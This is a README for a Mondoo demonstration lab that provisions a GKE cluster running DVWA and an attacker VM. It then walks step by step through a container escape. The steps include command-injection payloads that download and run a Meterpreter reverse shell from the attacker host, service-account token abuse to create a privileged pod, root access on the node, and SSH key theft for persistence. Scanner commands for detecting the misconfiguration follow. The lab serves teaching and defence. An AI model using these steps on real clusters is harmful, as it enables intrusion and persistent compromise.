# GKE container escape demo

DVWA is the "Damn Vulnerable Web Application" that will be used to demonstrate how a vulnerability in a container can lead to access to the host and to the cluster.

This folder contains Terraform automation code to provision the following:

- **Google GKE Cluster** - 3 worker managed nodes (standard_d2_v2)
- **Ubuntu 22.10 Linux Instance** - This instance is provisioned for the demonstration of the container-escape demo. (Using e2-medium)

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [GKE container escape demo](#gke-container-escape-demo)
  - [Prerequisites](#prerequisites)
  - [Provision the cluster](#provision-the-cluster)
  - [Connect to the cluster](#connect-to-the-cluster)
  - [Deploy Mondoo Operator to GKE](#deploy-mondoo-operator-to-gke)
    - [Deploy cert-manager](#deploy-cert-manager)
    - [Deploy Mondoo Operator](#deploy-mondoo-operator)
  - [Deploy and configure DVWA](#deploy-and-configure-dvwa)
    - [Configure Port Forwarding](#configure-port-forwarding)
    - [Login to DVWA](#login-to-dvwa)
  - [Setup Attacker Linux Instance](#setup-attacker-linux-instance)
    - [Start the container listener](#start-the-container-listener)
    - [Start Ruby webserver](#start-ruby-webserver)
    - [Determine the attacker machine's public IP](#determine-the-attacker-machines-public-ip)
    - [Escape time](#escape-time)
  - [Escaping the pod and get a shell on the node (google compute instance)](#escaping-the-pod-and-get-a-shell-on-the-node-google-compute-instance)
    - [Enumerate Privileges of the service account running the container](#enumerate-privileges-of-the-service-account-running-the-container)
    - [Deploy a pod that will get you a `root` account on the node](#deploy-a-pod-that-will-get-you-a-root-account-on-the-node)
  - [Gaining a persistent bash shell on the node](#gaining-a-persistent-bash-shell-on-the-node)
  - [Mondoo scan commands](#mondoo-scan-commands)
    - [Scan kubernetes manifest](#scan-kubernetes-manifest)
    - [Scan container image from registry](#scan-container-image-from-registry)
    - [Scan Kubernetes GKE cluster](#scan-kubernetes-gke-cluster)
    - [Shell to Kubernetes GKE cluster](#shell-to-kubernetes-gke-cluster)
    - [Scan a Google Cloud project](#scan-a-google-cloud-project)
    - [Shell to a Google Cloud project](#shell-to-a-google-cloud-project)
  - [Destroy the cluster](#destroy-the-cluster)
  - [License and Author](#license-and-author)
  - [Disclaimer](#disclaimer)

<!-- /code_chunk_output -->

## Prerequisites

- [Google GCP Account](https://cloud.google.com/free/)
  - make sure you to give the account your login in with the following IAM role [here](https://console.cloud.google.com/iam-admin):
  ```
  Access Approval Config Editor
  Access Transparency Admin
  Cloud KMS Admin
  DNS Administrator
  Essential Contacts Admin
  Owner
  ```

- Create a `terraform.tfvars`` file with the following variables
  ```
  project_id = "your-project-3" #your gcp project string
  region = "us-central1"
  zone = "us-central1-a"
  project_number = "" #your gcp project number
  gke_version = "1.25.15-gke.1083000" # built on GKE 1.25, might need to be updated
  ```

- [gcloud CLI](https://cloud.google.com/sdk/docs/install)

  - make sure to install the [gke-gcloud-auth-plugin](https://cloud.google.com/blog/products/containers-kubernetes/kubectl-auth-changes-in-gke), usually via the command:

  ```bash
  gcloud components install gke-gcloud-auth-plugin
  ```

  - make sure to login to you Google Cloud account via:

  ```bash
  gcloud auth application-default login
  ```

  - make sure to set gcloud CLI to the right project

  ```bash
  gcloud config set project <your-project-id> #e.g. my-test-project
  ```

- [Terraform](https://learn.hashicorp.com/tutorials/terraform/install-cli)
- [kubectl](https://kubernetes.io/docs/tasks/tools/#kubectl) - Kubectl must be installed on the host that you run `terraform` from.

## Provision the cluster

1. Clone the project

```bash title="Clone the project"
git clone git@github.com:Lunalectric/container-escape.git
```

2. cd into the terraform folder

```bash
cd container-escape/gke
```

3. Initialize the project (download modules)

```bash
terraform init
```

4. Check that everything is ready (and safe plan to a local file)

```bash
terraform plan -out plan.out
```

5. Apply the configuration

```bash
terraform apply plan.out -auto-approve
```

Once the provisioning completes you will see something like this:

```bash

Apply complete! Resources: 16 added, 0 changed, 0 destroyed.

Outputs:

attacker_vm_name = "lunalectric-attacker-vm-umxf"
summary = <<EOT

Connect to attacker VM (in 3-4 separate terminals):
gcloud compute ssh lunalectric-attacker-vm-umxf

Connect to your GKE cluster via gcloud:
gcloud container clusters get-credentials lunalectric-gke-cluster-umxf --region us-central1


kubectl apply -f ../assets/dvwa-deployment-no-privileged.yml
kubectl port-forward $(kubectl get pods -o name) 8080:80


EOT
target_cluster_name = "lunalectric-gke-cluster-umxf"

```

## Connect to the cluster

After Terraform finishes provisioning, you can use `gcloud` to connect to your GKE cluster:

```bash
gcloud container clusters get-credentials lunalectric-gke-cluster-$suffix --region us-central1
```

```bash
kubectl get nodes
NAME                                                  STATUS   ROLES    AGE   VERSION
gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz   Ready    <none>   82m   v1.23.16-gke.1400
gke-lunalectric-gke--lunalectric-pool-b7d2d926-t991   Ready    <none>   83m   v1.23.16-gke.1400
gke-lunalectric-gke--lunalectric-pool-d85199a0-2484   Ready    <none>   83m   v1.23.16-gke.1400
```

## Deploy Mondoo Operator to GKE

Deploy the Mondoo Operator to the GKE cluster according the manual [https://mondoo.com/docs/platform/cloud/kubernetes/scan-kubernetes-with-operator/](https://mondoo.com/docs/platform/cloud/kubernetes/scan-kubernetes-with-operator/)

### Deploy cert-manager

At first deploy the cert-manager from [https://cert-manager.io/docs/installation/](https://cert-manager.io/docs/installation/):

```bash
kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.11.0/cert-manager.yaml
```

### Deploy Mondoo Operator

Create a Kubernetes Integration in the Mondoo Dashboard [https://console.mondoo.com/](https://console.mondoo.com/).

![](../assets/mondoo-dashboard-k8s-integration-aks.png)

Copy and paste the install commands from the Mondoo Dashboard to deploy the Mondoo Operator

![](../assets/mondoo-dashboard-k8s-install-commands-aks.png)

## Deploy and configure DVWA

Deploy the DVWA application to your GKE cluster.

```bash
kubectl apply -f ../assets/dvwa-deployment-no-privileged.yml
deployment.apps/dvwa-container-escape created
```

Check if the deployment and pod is working.

```bash
kubectl get deployments
NAME                    READY   UP-TO-DATE   AVAILABLE   AGE
dvwa-container-escape-via-service-account   1/1     1            1           47s
```

```bash
kubectl describe pods
Name:         dvwa-container-escape-via-service-account-86cb94f64b-q2rdm
Namespace:    default
Priority:     0
Node:         gke-lunalectric-gke--lunalectric-pool-b7d2d926-t991/10.10.10.4
Start Time:   Mon, 24 Apr 2023 23:32:42 +0200
Labels:       app=dvwa-container-escape-via-service-account
              pod-template-hash=9f5694b84
Annotations:  <none>
Status:       Running
IP:           10.224.1.4
IPs:
  IP:           10.224.1.4
Controlled By:  ReplicaSet/dvwa-container-escape-via-service-account-86cb94f64b
Containers:
  dvwa:
    Container ID:   containerd://7f2dfdaf3433fe1de07d19b92b9179792be66e3f3d7fe745b3f8992df1dd652d
    Image:          docker.io/pmuench/dvwa-container-escape
    Image ID:       docker.io/pmuench/dvwa-container-escape@sha256:a9e098747b285f4047e3662925f2832fbdd61d5e3d68647bbe91062348a529fd
    Port:           80/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Mon, 24 Apr 2023 23:33:02 +0200
    Ready:          True
    Restart Count:  0
    Environment:    <none>
    Mounts:
      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-9l7ng (ro)
Conditions:
  Type              Status
  Initialized       True
  Ready             True
  ContainersReady   True
  PodScheduled      True
Volumes:
  kube-api-access-9l7ng:
    Type:                    Projected (a volume that contains injected data from multiple sources)
    TokenExpirationSeconds:  3607
    ConfigMapName:           kube-root-ca.crt
    ConfigMapOptional:       <nil>
    DownwardAPI:             true
QoS Class:                   BestEffort
Node-Selectors:              <none>
Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
Events:                      <none>

```

### Configure Port Forwarding

Establish a port forwarding to reach the DVWA application via your browser. Open a terminal and run the following command to start port forward to the DVWA pod on `8080`:

```bash
kubectl port-forward $(kubectl get pods -o name) 8080:80
```

### Login to DVWA

![Log in to DVWA](../assets/dvwa_login.png)

Open a browser and navigate to http://localhost:8080.

Log in to DVWA using `admin` with the password `password`.

![Reset the Database](../assets/dvwa_db_reset.png)

Once logged in, select "Create / Reset Database" after which, you will be logged out. Log back in to the web application and select "Command Injection."

Next, open three command line terminals and continue the setup process.

## Setup Attacker Linux Instance

The Attacker Linux instance has all of the binaries and scripts you will need to hack the GKE deployment. Connect the to the Attacker instance via the `gcloud` command provided in the output:

```bash
gcloud container clusters get-credentials lunalectric-gke-cluster-ua3k --region us-central1
No zone specified. Using zone [us-central1-a] for instance: [lunalectric-attacker-vm-ua3k].
Welcome to Ubuntu 22.10 (GNU/Linux 5.19.0-1015-gcp x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

39 updates can be applied immediately.
25 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Last login: Thu Apr 20 22:06:52 2023 from 185.168.9.28

gcp-user-name@@lunalectric-attacker-vm-ua3k:~$ sudo -i
root@lunalectric-attacker-vm-ua3k:~#
```

Once you have ssh'd on to the host you will find a `/root/container-escape` directory with the following files:

```bash
root@lunalectric-attacker-vm-3v0c:~# ls -l container-escape/
total 1136
-rwxr-xr-x 1 root root 1137112 May  4 11:33 met-container
-rwxr-xr-x 1 root root     207 May  4 11:33 met-host
-rwxr-xr-x 1 root root     129 May  4 11:33 msfconsole1
-rwxr-xr-x 1 root root     123 May  4 11:33 msfconsole2
-rw-r--r-- 1 root root     353 May  4 11:33 pod-esc.yaml
-rw-r--r-- 1 root root      13 May  4 11:33 pub-ip
-rwxr-xr-x 1 root root      27 May  4 11:33 start_ruby_webserver
```

### Start the container listener

In the first terminal, start `msfconsole` listening on port `4242` for the container:

```bash
root@lunalectric-attacker-vm-ua3k:~# cd /root/container-escape/

root@attacker:~/container-escape# ./msfconsole1
[*] Using configured payload generic/shell_reverse_tcp
payload => linux/x86/meterpreter_reverse_tcp
lhost => 0.0.0.0
lport => 4242
[*] Started reverse TCP handler on 0.0.0.0:4242
```

### Start Ruby webserver

In the third terminal, start webserver with Ruby:

```bash
user@attacker:~$ sudo -i

root@lunalectric-attacker-vm-ua3k:~# cd /root/container-escape/

root@attacker:~/container-escape# ./start_ruby_webserver
[2022-08-15 18:28:35] INFO  WEBrick 1.4.2
[2022-08-15 18:28:35] INFO  ruby 2.5.1 (2018-03-29) [x86_64-linux-gnu]
[2022-08-15 18:28:35] INFO  WEBrick::HTTPServer#start: pid=3850 port=8001
```

### Determine the attacker machine's public IP

```bash
root@lunalectric-attacker-vm-3v0c:~# cat container-escape/pub-ip
34.70.139.37
```

### Escape time

In the webapp (browser) do the first attack to gain access to the container.

```bash
;curl -vk http://<attacker_vm_public_ip>:8001/met-container -o /tmp/met
```

Change the permissions to make the script executable

```bash
;chmod 777 /tmp/met
```

Execute the script

```bash
;/tmp/met
```

Now you have a reverse meterpreter session from the container, to get a shell type `shell`

```bash
meterpreter > shell
```

```
Process 321 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

You have a shell and are the `www-data` user.

## Escaping the pod and get a shell on the node (google compute instance)

**Get the `kubectl` binary**

```
export PATH=/tmp:$PATH; cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.24.12/bin/linux/amd64/kubectl; chmod 555 kubectl
```

**Find out the node IP via the `/etc/resolv.conf`**

```bash
cat /etc/resolv.conf
```

```
search default.svc.cluster.local svc.cluster.local cluster.local us-central1-c.c.<username>-development-3.internal c.<username>-development-3.internal google.internal
nameserver 10.228.0.10 #                 <----This is the line we need
options ndots:5
```

The local node for the nameserver `10.228.0.10` is always the `x.x.x.1` address, so in that case `10.228.0.1`

---

### Enumerate Privileges of the service account running the container

**Now you can query the Node API if the service account on the pod has sufficient permissions to create a pod**

```bash
kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/ auth can-i create pods
```

```
yes
```

### Deploy a pod that will get you a `root` account on the node

**Download the `pod-esc.yaml` from the attacker VM**

```bash
curl -vk http://<attacker_vm_public_ip>:8001/pod-esc.yaml -o /tmp/pod-esc.yaml
```

**Create the pod on the cluster**

```bash
kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  apply -f /tmp/pod-esc.yaml
```

```
pod/priv-and-hostpid-exec-pod created
```

**Access the node via the just created escape pod**

```
kubectl --token=`cat /run/secrets/kubernetes.io/serviceaccount/token` --certificate-authority=/run/secrets/kubernetes.io/serviceaccount/ca.crt -n `cat /run/secrets/kubernetes.io/serviceaccount/namespace` --server=https://10.228.0.1/  exec -it priv-and-hostpid-exec-pod -n default  -- sh
```

```
Unable to use a TTY - input is not a terminal or the right kind of file
```

**Now you can run commands on the node**

```
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

**Verifying you are on the node via the Google Metadata Service**

```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/hostname
```

```
gke-lunalectric-gke--lunalectric-pool-0e144d64-33rz.us-central1-f.c.<username>-development-3.internal
```

## Gaining a persistent bash shell on the node

**Confirming the hostname and IP address of the node**
First we need to find out on which node we are operating.
Which we can confirm by just asking for the hostname.

```bash
hostname
```

```
gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj
```

We can then either directly from the node try to confirm our external IP address via curl.

```bash
curl http://ifconfig.me/
```

```
35.226.180.169
```

Or, alternatively on the system from which we deployed the Terraform run:

```bash
gcloud compute instances list
```

```
NAME                                                 ZONE           MACHINE_TYPE  PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP     STATUS
gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj  us-central1-a  e2-medium                  10.10.10.3   35.226.180.169  RUNNING
lunalectric-attacker-vm-9cqc                         us-central1-a  e2-medium                  10.10.11.2   34.30.213.12    RUNNING
gke-lunalectric-gke--lunalectric-pool-66102390-zr4g  us-central1-c  e2-medium                  10.10.10.5   35.238.236.209  RUNNING
gke-lunalectric-gke--lunalectric-pool-24ac192f-x1gh  us-central1-f  e2-medium                  10.10.10.4   34.136.208.72   RUNNING

```

**Generating a ssh-key on the node**

There should be a user on the node that mimics your local username you are connected to with `gcloud`. To find it use the following command:

```
cat /etc/passwd
```

```
sshd:!:204:204:ssh daemon:/dev/null:/bin/false
ntp:!:203:203:network time protocol daemon:/dev/null:/bin/false
traced:!:20160:20160:Perfetto system tracing service:/dev/null:/bin/false
traced-probes:!:20161:20161:Perfetto system tracing probes using debugfs, procfs and sysfs.:/dev/null:/bin/false
systemd-network:!:274:274:systemd-networkd daemon:/dev/null:/bin/false
systemd-resolve:!:275:275:systemd-resolved daemon:/dev/null:/bin/false
systemd-timesync:!:271:271:systemd-timesyncd daemon:/dev/null:/bin/false
root:x:0:0:root:/root:/bin/bash
bin:!:1:1:bin:/bin:/bin/false
daemon:!:2:2:daemon:/sbin:/bin/false
adm:!:3:4:adm:/var/adm:/bin/false
lp:!:4:7:lp:/var/spool/lpd:/bin/false
news:!:9:13:news:/var/spool/news:/bin/false
uucp:!:10:14:uucp:/var/spool/uucp:/bin/false
portage:!:250:250:portage:/var/tmp/portage:/bin/false
nobody:!:65534:65534:nobody:/dev/null:/bin/false
input:!:222:222:dev/input/event access:/dev/null:/bin/false
messagebus:!:201:201:dbus-daemon:/dev/null:/bin/false
chronos:!:1000:1000:unused stub account:/dev/null:/bin/false
chronos-access:!:1001:1001:non-chronos user with access to chronos data:/dev/null:/bin/false
metrics:!:20140:20140:user for metrics_daemon to run its services in sandboxed environment:/dev/null:/bin/false
crash:!:20137:20137:Crash reporter daemon.:/dev/null:/bin/false
syslog:!:202:202:rsyslog:/dev/null:/bin/false
debugfs-access:!:605:605:access to debugfs:/dev/null:/bin/false
<username>:x:20162:20166::/home/<username>:/bin/bash

```

Then we switch to the context of that user.

```bash
su <username>
```

Change to the user's `.ssh` directory

```bash
cd /home/<username>/.ssh
```

Then run the command to generate a new ssh_key for <username>, for which we do not need to enter a password:

```bash
ssh-keygen
```

```
Generating public/private rsa key pair.
Enter file in which to save the key (/home/<username>/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/<username>/.ssh/id_rsa
Your public key has been saved in /home/<username>/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:aTa7xaFFn3n4facOuCkxomxaarDvfTyTwKyybseV0k <username>@gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|     W           |
| .o . .  .       |
|Bo . .  S . . o  |
|..  o  . + + + . |
|o..o ...B * . .  |
|.++o..oB B . . o.|
|xo+oa=O=*    .o.o|
+----[SHA256]-----+
```

Now we can display the private key via `cat`:

```bash
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
<snip>
-----END OPENSSH PRIVATE KEY-----
```

We copy and paste this key to our local machine to the file `id_rsa` and now we can connect directly via `ssh` to the compromised node with the following command:

```bash
ssh -i id_rsa -o CheckHostIP=no -o StrictHostKeyChecking=no <username>@35.226.180.169
```

```
Welcome to Kubernetes v1.23.16-gke.1400!

You can find documentation for Kubernetes at:
  http://docs.kubernetes.io/

The source for this release can be found at:
  /home/kubernetes/kubernetes-src.tar.gz
Or you can download it at:
  https://storage.googleapis.com/kubernetes-release-gke/release/v1.23.16-gke.1400/kubernetes-src.tar.gz

It is based on the Kubernetes source at:
  https://github.com/kubernetes/kubernetes/tree/v1.23.16-gke.1400

For Kubernetes copyright and licensing information, see:
  /home/kubernetes/LICENSES
```

And we get `root` with a simple sudo:

```
<username>@gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj ~ $ sudo su
```

```
gke-lunalectric-gke--lunalectric-pool-06b8ea4c-hnlj /home/<username> # id
```

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video),1001(chronos-access)
```

## Mondoo scan commands

### Scan kubernetes manifest

```bash
cnspec scan k8s --path ../assets/dvwa-deployment-no-privileged.yml
```

### Scan container image from registry

```bash
cnspec scan container docker.io/pmuench/dvwa-container-escape:latest
```

### Scan Kubernetes GKE cluster

```bash
cnspec scan k8s
```

### Shell to Kubernetes GKE cluster

```bash
cnspec shell k8s
```

List all of the pods and all of their settings:

```bash
k8s.pods { * }
```

Search for the dvwa pod and show `privileged: true`

```bash
k8s.pods.where( labels['app'] == /dvwa/ ) { * }
```

Use MQL to search for configuration across your cluster such as "are containers being pulled using `tags` or their image `digest`:

```bash
k8s.pods { _.containers { image containerImage { identifierType == "digest" } } }
```

You can also use a `where` clause and just turn that into a list and filter the results:

```bash
k8s.pods.where( _.containers { image containerImage { identifierType != "digest" } })
```

You can quick check the securityContext of your clusters to see if `privileged` is set to `true`:

```bash
k8s.pods { containers { name securityContext } }
```

Get the list of pods that fail:

```bash
k8s.pods.none(containers { securityContext['privileged'] == true })
```

### Scan a Google Cloud project

```bash
cnspec scan gcp project {project-name}
```

### Shell to a Google Cloud project

```bash
cnspec shell gcp project {project-name}
```

List Google Compute Instances (VMs)

```bash
gcp.compute.instances { * }
```

Get properties of all key rings

```bash
gcp.project.kms.keyrings {*}
```

## Destroy the cluster

**NOTE: This command has to be run twice to remove all assets created!**

```bash
terraform destroy -auto-approve
```

## License and Author

- Author:: Mondoo Inc

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

## Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that we (Mondoo Inc) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not Mondoo Inc's responsibility.
